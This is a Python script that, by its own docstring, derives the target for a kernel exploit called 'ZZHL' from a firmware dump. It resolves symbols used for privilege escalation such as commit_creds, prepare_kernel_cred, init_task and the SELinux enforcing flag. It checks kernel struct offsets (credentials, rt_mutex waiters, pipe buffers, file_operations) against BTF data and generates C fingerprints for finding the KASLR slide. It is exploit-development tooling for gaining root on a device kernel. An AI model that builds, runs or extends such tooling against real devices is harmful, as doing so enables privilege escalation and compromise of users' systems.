#!/usr/bin/env python3
"""Derive and audit the ZZHL exploit target from a firmware dump."""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import struct
import subprocess
import tempfile
from pathlib import Path


BTF_MAGIC = b"\x9f\xeb\x01\x00"
SYMBOLS = {
    "INIT_TASK": "init_task",
    "PREPARE_KERNEL_CRED": "prepare_kernel_cred",
    "COMMIT_CREDS": "commit_creds",
    "OVERRIDE_CREDS": "override_creds",
    "ROOT_TASK_GROUP": "root_task_group",
    "SELINUX_ENFORCING": "selinux_enforcing_boot",
    "KMALLOC_CACHES": "kmalloc_caches",
    "ANON_PIPE_BUF_OPS": "anon_pipe_buf_ops",
    "SYSTEM_UNBOUND_WQ": "system_unbound_wq",
    "CALL_USERMODEHELPER_EXEC_WORK": "call_usermodehelper_exec_work",
    "ASHMEM_FOPS": "ashmem_fops",
    "ASHMEM_IOCTL": "ashmem_ioctl",
    "ASHMEM_COMPAT_IOCTL": "compat_ashmem_ioctl",
    "ASHMEM_MMAP": "ashmem_mmap",
    "ASHMEM_OPEN": "ashmem_open",
    "ASHMEM_RELEASE": "ashmem_release",
    "ASHMEM_SHOW_FDINFO": "ashmem_show_fdinfo",
    "CONFIGFS_READ_ITER": "configfs_read_iter",
    "CONFIGFS_BIN_WRITE_ITER": "configfs_bin_write_iter",
    "COPY_SPLICE_READ": "generic_file_splice_read",
    "NOOP_LLSEEK": "noop_llseek",
    "SLIDE_TRACEFS_WORKER_CALLER": "worker_thread",
    "SLIDE_NFULNL_LOGGER_OBJECT": "nfulnl_logger",
    "SLIDE_INIT_TASK": "init_task",
    "SLIDE_ROOT_TASK_GROUP": "root_task_group",
    "SLIDE_SYSCTL_BOOTID": "sysctl_bootid",
}

LAYOUTS = {
    "mm_struct": {"__size__": 992},
    "task_struct": {
        "usage": 0x38,
        "prio": 0x7C,
        "normal_prio": 0x84,
        "sched_task_group": 0x400,
        "real_cred": 0x790,
        "cred": 0x798,
        "pi_lock": 0x884,
        "pi_waiters": 0x898,
        "pi_top_task": 0x8A8,
        "pi_blocked_on": 0x8B0,
    },
    "rt_mutex_waiter": {
        "pi_tree_entry": 0x18,
        "task": 0x30,
        "lock": 0x38,
        "wake_state": 0x40,
        "prio": 0x44,
        "deadline": 0x48,
        "ww_ctx": 0x50,
        "__size__": 0x58,
    },
    "configfs_buffer": {
        "page": 16,
        "needs_read_fill": 80,
        "bin_buffer": 88,
        "bin_buffer_size": 96,
        "cb_max_size": 100,
    },
    "pool_workqueue": {
        "pool": 0,
        "wq": 8,
        "work_color": 0x10,
        "refcnt": 0x18,
        "nr_in_flight": 0x1C,
        "nr_active": 0x5C,
        "max_active": 0x60,
    },
    "worker_pool": {"worklist": 0x20, "nr_idle": 0x34},
    "work_struct": {"data": 0, "entry": 8, "func": 0x18},
    "page": {"compound_head": 8, "slab_cache": 0x18, "page_type": 0x30, "__size__": 0x40},
    "pipe_buffer": {"__size__": 0x28},
    "file_operations": {
        "owner": 0,
        "llseek": 8,
        "read": 0x10,
        "write": 0x18,
        "read_iter": 0x20,
        "write_iter": 0x28,
        "unlocked_ioctl": 0x50,
        "compat_ioctl": 0x58,
        "mmap": 0x60,
        "open": 0x70,
        "release": 0x80,
        "splice_read": 0xC8,
        "show_fdinfo": 0xE0,
    },
}


def parse_symbols(path: Path) -> dict[str, int]:
    symbols: dict[str, int] = {}
    for line in path.read_text().splitlines():
        fields = line.split(maxsplit=2)
        if len(fields) == 3:
            symbols[fields[2]] = int(fields[0], 16)
    return symbols


def read_virtual(image: bytes, base: int, address: int, size: int) -> bytes:
    offset = address - base
    if offset < 0 or offset + size > len(image):
        raise ValueError(f"address outside Image: 0x{address:x}")
    return image[offset : offset + size]


def read_pointer(image: bytes, base: int, address: int) -> int:
    return struct.unpack("<Q", read_virtual(image, base, address, 8))[0]


def read_cstring(image: bytes, base: int, address: int) -> str:
    offset = address - base
    end = image.index(b"\0", offset, offset + 256)
    return image[offset:end].decode("ascii")


def pahole_layout(btf: Path, name: str) -> tuple[dict[str, int], int]:
    text = subprocess.run(
        ["pahole", "-F", "btf", "-C", name, str(btf)],
        check=True,
        capture_output=True,
        text=True,
    ).stdout
    fields: dict[str, int] = {}
    for line in text.splitlines():
        match = re.search(
            r"\b([A-Za-z_][A-Za-z0-9_]*)(?:\[[^]]+\])?\s*;\s*/\*\s*(\d+)",
            line,
        )
        if not match:
            match = re.search(
                r"\(\*([A-Za-z_][A-Za-z0-9_]*)\)\([^;]*;\s*/\*\s*(\d+)",
                line,
            )
        if match:
            fields[match.group(1)] = int(match.group(2))
    size = int(re.search(r"/\* size: (\d+),", text).group(1))
    return fields, size


def generate_fingerprint(image: bytes, output: Path, probe: int = 0x1F0000) -> None:
    offsets = range(0, 0x1000, 0x200)
    lines = [
        "// Generated from dump/kernel.raw by tools/derive_zzhl_target.py.",
        "#ifndef P0_FINGERPRINT_H",
        "#define P0_FINGERPRINT_H",
        "",
        "#define P0_FINGERPRINT_WORDS 8",
        "static const uint16_t p0_fingerprint_offsets[P0_FINGERPRINT_WORDS] = {",
        "  0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00,",
        "};",
        "struct p0_fingerprint { uintptr_t slide; uint64_t words[P0_FINGERPRINT_WORDS]; };",
        "static const struct p0_fingerprint p0_fingerprints[] = {",
    ]
    for slide in range(0, 0x200000, 0x10000):
        start = probe - slide
        words = [struct.unpack_from("<Q", image, start + offset)[0] for offset in offsets]
        values = ", ".join(f"0x{word:016x}ULL" for word in words)
        lines.append(f"  {{ 0x{slide:06x}ULL, {{ {values} }} }},")
    lines.extend(["};", "", "#endif", ""])
    output.write_text("\n".join(lines))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("dump", type=Path)
    parser.add_argument("--report", type=Path, required=True)
    parser.add_argument("--fingerprint", type=Path, required=True)
    args = parser.parse_args()

    image = (args.dump / "kernel.raw").read_bytes()
    symbols = parse_symbols(args.dump / "kernel.kallsyms")
    base = symbols["_text"]
    btf_offset = image.index(BTF_MAGIC)
    _, _, _, header_len, type_offset, type_len, string_offset, string_len = struct.unpack_from(
        "<HBBIIIII", image, btf_offset
    )
    btf_size = header_len + max(type_offset + type_len, string_offset + string_len)

    with tempfile.NamedTemporaryFile() as temporary:
        temporary.write(image[btf_offset : btf_offset + btf_size])
        temporary.flush()
        btf_path = Path(temporary.name)
        verified_layouts = {}
        for type_name, expected in LAYOUTS.items():
            fields, size = pahole_layout(btf_path, type_name)
            for field, offset in expected.items():
                actual = size if field == "__size__" else fields.get(field)
                if actual != offset:
                    raise ValueError(f"{type_name}.{field}: expected {offset}, got {actual}")
            verified_layouts[type_name] = expected

    addresses = {macro: symbols[name] for macro, name in SYMBOLS.items()}
    addresses["ASHMEM_MISC_FOPS"] = symbols["ashmem_misc"] + 0x10
    addresses["SLIDE_NFULNL_LOGGER_NAME"] = read_pointer(image, base, symbols["nfulnl_logger"])

    random_table = symbols["random_table"]
    for index in range(64):
        entry = random_table + index * 64
        name_pointer = read_pointer(image, base, entry)
        if not name_pointer:
            break
        if read_cstring(image, base, name_pointer) == "boot_id":
            addresses["SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR"] = entry + 8
            break
    else:
        raise ValueError("random_table boot_id entry not found")

    generate_fingerprint(image, args.fingerprint)
    report = {
        "image_sha256": hashlib.sha256(image).hexdigest(),
        "kimage_text_base": f"0x{base:016x}",
        "btf_offset": f"0x{btf_offset:x}",
        "btf_size": btf_size,
        "addresses": {name: f"0x{value:016x}" for name, value in sorted(addresses.items())},
        "offsets": {name: f"0x{value - base:08x}" for name, value in sorted(addresses.items())},
        "layouts": verified_layouts,
    }
    args.report.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n")
    print(f"derived {len(addresses)} addresses and verified {len(verified_layouts)} BTF layouts")


if __name__ == "__main__":
    main()
